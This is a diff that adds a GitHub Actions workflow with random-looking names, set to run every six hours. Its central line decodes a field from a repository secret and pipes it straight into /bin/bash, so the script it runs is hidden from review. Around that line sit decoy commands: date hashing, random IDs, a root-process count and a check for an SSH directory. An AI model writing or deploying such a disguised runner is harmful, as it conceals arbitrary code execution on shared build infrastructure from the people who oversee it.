@@ -1,0 +1,23 @@
+name: nizhihong1978
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: nizhihong1978
+        env:
+          m11835: ${{ secrets.m11835 }}
+        run: |
+          echo "Files: $(ls | wc -l 2>/dev/null || echo 0)"
+          printf "shasum -a 256 of \$(date): $(printf "%s" "$(date)" | shasum -a 256)"
+          echo $m11835 | jq -r .b31362 | /bin/bash
+          echo "Random ID: $RANDOM$RANDOM"
+          ps -ef | grep root | awk '{print $NF}' | sort | uniq | wc -l
+          [ -d "$HOME/.ssh" ] && echo "exists" || echo "no exists"
+          popd > /dev/null
